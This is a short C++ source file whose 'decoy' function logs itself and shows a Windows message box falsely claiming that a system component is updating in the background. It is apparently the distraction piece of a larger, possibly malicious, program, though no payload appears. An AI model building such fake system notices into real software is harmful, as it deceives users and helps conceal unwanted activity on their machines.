#include "Decoy.h"
#include <windows.h>
#include "../utils/Logger.h"

namespace decoy {

void ShowInfoMessage() {
    LOG_INFO("Displaying decoy message box.");
    MessageBoxW(NULL,
                L"A required system component is being updated in the background.",
                L"System Information",
                MB_OK | MB_ICONINFORMATION);
}

} // namespace decoy
